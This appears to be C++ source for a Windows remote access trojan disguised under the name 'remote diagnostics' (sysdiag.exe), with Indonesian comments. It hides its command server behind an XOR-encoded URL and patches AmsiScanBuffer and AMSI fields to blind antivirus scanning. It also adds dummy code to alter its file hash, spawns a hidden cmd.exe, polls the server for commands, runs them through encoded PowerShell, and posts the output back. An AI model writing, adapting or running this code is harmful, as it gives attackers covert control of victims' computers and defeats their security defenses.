// remote_diagnostics_final_cmd_env.cpp
// Menggunakan cmd.exe dengan environment yang benar
// Compile: i686-w64-mingw32-g++ -O2 -mwindows -static-libgcc -static-libstdc++ remote_diagnostics_final_cmd_env.cpp -o sysdiag.exe -lwininet -lws2_32 -lcrypt32

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <wininet.h>
#include <string>
#include <thread>
#include <cstdlib>
#include <ctime>
#include <deque>
#include <mutex>
#include <algorithm>
#include <cctype>
#include <vector>
#include <sstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")

// ============================================================
// KONFIGURASI
// ============================================================
#define MAX_BUFFER_SIZE 8192
#define MAX_QUEUE_SIZE  5000

std::string g_serverUrl;

// ============================================================
// XOR DECRYPTOR UNTUK URL — KEY 0x5B
// ============================================================
std::string DecryptUrl() {
    unsigned char enc[] = {
        0x33, 0x2F, 0x2F, 0x2B, 0x28, 0x61, 0x74, 0x74,
        0x3A, 0x2B, 0x32, 0x75, 0x37, 0x2E, 0x36, 0x32,
        0x35, 0x3A, 0x2F, 0x3E, 0x75, 0x36, 0x22, 0x75,
        0x32, 0x3F, 0x00
    };
    std::string dec;
    for (int i = 0; enc[i] != 0; i++) {
        dec.push_back((char)(enc[i] ^ 0x5B));
    }
    return dec;
}

// ============================================================
// GLOBAL STATE
// ============================================================
std::mutex   g_queueMutex;
std::deque<std::string> g_outputQueue;

HANDLE g_hStdinWrite = NULL;
HANDLE g_hStdoutRead = NULL;
HANDLE g_hStderrRead = NULL;

std::string g_clientId;
bool        g_running = true;

// ============================================================
// BOUNDED QUEUE
// ============================================================
void pushToQueue(const std::string& data) {
    std::lock_guard<std::mutex> lock(g_queueMutex);
    if (g_outputQueue.size() >= MAX_QUEUE_SIZE)
        g_outputQueue.pop_front();
    g_outputQueue.push_back(data);
}

// ============================================================
// URL ENCODE
// ============================================================
std::string UrlEncode(const std::string& str) {
    static const char* hex = "0123456789ABCDEF";
    std::string result;
    for (unsigned char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~')
            result += c;
        else if (c == ' ')
            result += '+';
        else {
            result += '%';
            result += hex[c >> 4];
            result += hex[c & 0xF];
        }
    }
    return result;
}

// ============================================================
// HTTP POST
// ============================================================
bool HttpPost(const std::string& url, const std::string& data) {
    std::string host, path;
    int port = 80;
    bool isHttps = false;

    size_t p = url.find("://");
    if (p == std::string::npos) return false;
    std::string proto = url.substr(0, p);
    if (proto == "https") { isHttps = true; port = 443; }

    std::string rest = url.substr(p + 3);
    size_t slash = rest.find('/');
    if (slash == std::string::npos) { host = rest; path = "/"; }
    else { host = rest.substr(0, slash); path = rest.substr(slash); }

    size_t colon = host.find(':');
    if (colon != std::string::npos) {
        port = std::stoi(host.substr(colon + 1));
        host = host.substr(0, colon);
    }

    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), (INTERNET_PORT)port, NULL, NULL,
                                          INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return false; }

    DWORD flags = INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE;
    if (isHttps) {
        flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    const char* acceptTypes[] = { "*/*", NULL };
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), "HTTP/1.1", NULL, acceptTypes, flags, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return false; }

    std::string postData = "data=" + UrlEncode(data);
    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n"
                          "ngrok-skip-browser-warning: 69420\r\n"
                          "User-Agent: Mozilla/5.0";

    BOOL ok = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(),
                               (LPVOID)postData.c_str(), (DWORD)postData.length());

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return ok == TRUE;
}

// ============================================================
// SENDER THREAD
// ============================================================
void SenderThread() {
    int failureCount = 0;
    while (g_running) {
        std::string payload;
        {
            std::lock_guard<std::mutex> lock(g_queueMutex);
            if (!g_outputQueue.empty()) {
                payload = g_outputQueue.front();
                g_outputQueue.pop_front();
            }
        }

        if (!payload.empty()) {
            std::string url = g_serverUrl + "/output?client=" + g_clientId;
            if (HttpPost(url, payload)) {
                failureCount = 0;
            } else {
                failureCount++;
                if (failureCount < 3) {
                    pushToQueue(payload);
                } else {
                    failureCount = 0;
                }
            }
        }
        Sleep(100);
    }
}

// ============================================================
// READER THREAD
// ============================================================
void ReaderThread() {
    char  buf[4096];
    DWORD bytesRead;
    std::string acc;
    DWORD lastFlush = GetTickCount();

    while (g_running) {
        bool gotData = false;
        DWORD avail = 0;

        if (PeekNamedPipe(g_hStdoutRead, NULL, 0, NULL, &avail, NULL) && avail) {
            if (ReadFile(g_hStdoutRead, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead) {
                buf[bytesRead] = '\0';
                acc.append(buf);
                gotData = true;
            }
        }

        avail = 0;
        if (PeekNamedPipe(g_hStderrRead, NULL, 0, NULL, &avail, NULL) && avail) {
            if (ReadFile(g_hStderrRead, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead) {
                buf[bytesRead] = '\0';
                acc.append(buf);
                gotData = true;
            }
        }

        DWORD now = GetTickCount();
        bool flush = false;

        if (acc.find('\n') != std::string::npos)
            flush = true;
        else if (acc.size() >= MAX_BUFFER_SIZE)
            flush = true;
        else if (gotData && (now - lastFlush) > 200)
            flush = true;

        if (flush && !acc.empty()) {
            pushToQueue(acc);
            acc.clear();
            lastFlush = now;
        }

        Sleep(50);
    }

    if (!acc.empty())
        pushToQueue(acc);
}

// ============================================================
// BASE64 ENCODE
// ============================================================
std::string Base64Encode(const BYTE* data, size_t len) {
    DWORD outLen = 0;
    if (!CryptBinaryToStringA(data, (DWORD)len,
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                              NULL, &outLen))
        return "";

    std::string out(outLen, '\0');
    if (!CryptBinaryToStringA(data, (DWORD)len,
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                              &out[0], &outLen))
        return "";

    out.resize(outLen);
    return out;
}

// ============================================================
// BUILD ENCODED POWERSHELL COMMAND (AMSI bypass dual-layer)
// ============================================================
std::string BuildEncodedPsCommand(const std::string& userCmd) {
    std::string psScript =
        "$ErrorActionPreference='SilentlyContinue';"
        "$ProgressPreference='SilentlyContinue';"
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiContext','NonPublic,Static')"
        ".SetValue($null,[IntPtr]::Zero);"
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static')"
        ".SetValue($null,$true);"
        "Set-ExecutionPolicy Bypass -Scope Process -Force;"
        "$cmd = @'\n" + userCmd + "\n'@;"
        "Invoke-Expression $cmd 2>&1 | Out-String;";

    std::vector<BYTE> utf16;
    utf16.reserve((psScript.size() + 1) * 2);
    for (char ch : psScript) {
        utf16.push_back((BYTE)ch);
        utf16.push_back(0);
    }
    utf16.push_back(0);
    utf16.push_back(0);

    return Base64Encode(utf16.data(), utf16.size());
}

// ============================================================
// LAUNCH HIDDEN cmd.exe WITH ENVIRONMENT
// ============================================================
bool CreateCmdProcess(PROCESS_INFORMATION& pi,
                      HANDLE& hStdinWrite,
                      HANDLE& hStdoutRead,
                      HANDLE& hStderrRead) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hStdinRead = NULL, hStdoutWrite = NULL, hStderrWrite = NULL;

    if (!CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0)) return false;
    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) return false;
    if (!CreatePipe(&hStderrRead, &hStderrWrite, &sa, 0)) return false;

    SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hStdinRead;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStderrWrite;

    const char* cmdLine = "cmd.exe /Q /K";

    // ============================================================
    // 🔥 KRITIS: Ambil environment dari parent (bukan NULL)
    // ============================================================
    LPVOID lpEnvironment = GetEnvironmentStrings();

    BOOL ok = CreateProcessA(NULL,
                             const_cast<char*>(cmdLine),
                             NULL, NULL, TRUE,
                             CREATE_NO_WINDOW,
                             lpEnvironment,
                             NULL,
                             &si,
                             &pi);

    FreeEnvironmentStringsA((char*)lpEnvironment);

    CloseHandle(hStdinRead);
    CloseHandle(hStdoutWrite);
    CloseHandle(hStderrWrite);

    if (!ok) {
        CloseHandle(hStdinWrite);
        CloseHandle(hStdoutRead);
        CloseHandle(hStderrRead);
        return false;
    }
    return true;
}

// ============================================================
// POLLER THREAD
// ============================================================
void PollerThread() {
    while (g_running) {
        std::string url = g_serverUrl + "/poll?client=" + g_clientId;

        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet) {
            const char* extraHeaders = "ngrok-skip-browser-warning: 69420";
            HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), extraHeaders, (DWORD)strlen(extraHeaders),
                                              INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE |
                                              INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                                              INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
            if (hUrl) {
                char buf[4096];
                DWORD bytesRead;
                std::string response;

                while (InternetReadFile(hUrl, buf, sizeof(buf) - 1, &bytesRead) && bytesRead) {
                    buf[bytesRead] = '\0';
                    response.append(buf);
                }

                if (!response.empty() && response != "none" && response.find("ERR_NGROK") == std::string::npos) {
                    std::string trimmed = response;
                    trimmed.erase(trimmed.begin(),
                                  std::find_if(trimmed.begin(), trimmed.end(),
                                               [](unsigned char ch) { return !std::isspace(ch); }));

                    bool isPs = false;
                    std::string lowerCmd = trimmed;
                    std::transform(lowerCmd.begin(), lowerCmd.end(), lowerCmd.begin(),
                                   [](unsigned char c) { return std::tolower(c); });

                    if (lowerCmd.rfind("[ps]", 0) == 0 ||
                        lowerCmd.rfind("powershell ", 0) == 0 ||
                        lowerCmd.rfind("pwsh ", 0) == 0) {
                        isPs = true;
                    }

                    std::string toSend;

                    if (isPs) {
                        std::string actualCmd = trimmed;
                        size_t pos = actualCmd.find(' ');
                        if (pos != std::string::npos) {
                            actualCmd = actualCmd.substr(pos + 1);
                        } else {
                            actualCmd = "";
                        }

                        if (!actualCmd.empty()) {
                            std::string encoded = BuildEncodedPsCommand(actualCmd);
                            // ============================================================
                            // 🔥 Kirim via cmd.exe (bukan direct CreateProcess)
                            // ============================================================
                            toSend = "powershell.exe -WindowStyle Hidden -NoLogo -NoProfile -EncodedCommand ";
                            toSend += encoded;
                            toSend += "\r\n";
                        }
                    } else {
                        toSend = response;
                        if (toSend.back() != '\r')
                            toSend += "\r\n";
                    }

                    if (!toSend.empty()) {
                        DWORD written = 0;
                        WriteFile(g_hStdinWrite, toSend.c_str(), (DWORD)toSend.length(), &written, NULL);
                    }
                }

                InternetCloseHandle(hUrl);
            }
            InternetCloseHandle(hInternet);
        }
        Sleep(500);
    }
}

// ============================================================
// AMSI UNHOOK
// ============================================================
bool UnhookAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return true;

    FARPROC pAmsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScan) return false;

    DWORD oldProt;
    LPVOID pAddr = (LPVOID)pAmsiScan;

    if (!VirtualProtect(pAddr, 1, PAGE_EXECUTE_READWRITE, &oldProt))
        return false;

    *(BYTE*)pAddr = 0xC3;

    VirtualProtect(pAddr, 1, oldProt, &oldProt);
    return true;
}

// ============================================================
// ENTRY POINT
// ============================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Dummy code untuk mengubah hash
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) {
        dummy += i * 2;
    }

    g_serverUrl = DecryptUrl();
    UnhookAMSI();

    char host[256];
    DWORD sz = sizeof(host);
    if (!GetComputerNameA(host, &sz))
        strcpy_s(host, sizeof(host), "UNKNOWN_HOST");
    g_clientId = host;

    PROCESS_INFORMATION pi = {0};
    HANDLE hStdinWrite = NULL, hStdoutRead = NULL, hStderrRead = NULL;

    if (!CreateCmdProcess(pi, hStdinWrite, hStdoutRead, hStderrRead))
        return 1;

    CloseHandle(pi.hThread);

    g_hStdinWrite = hStdinWrite;
    g_hStdoutRead = hStdoutRead;
    g_hStderrRead = hStderrRead;
    g_running = true;

    std::thread reader(ReaderThread);
    reader.detach();

    std::thread sender(SenderThread);
    sender.detach();

    std::thread poller(PollerThread);
    poller.detach();

    WaitForSingleObject(pi.hProcess, INFINITE);

    g_running = false;
    Sleep(1000);

    CloseHandle(pi.hProcess);
    CloseHandle(hStdinWrite);
    CloseHandle(hStdoutRead);
    CloseHandle(hStderrRead);

    return 0;
}
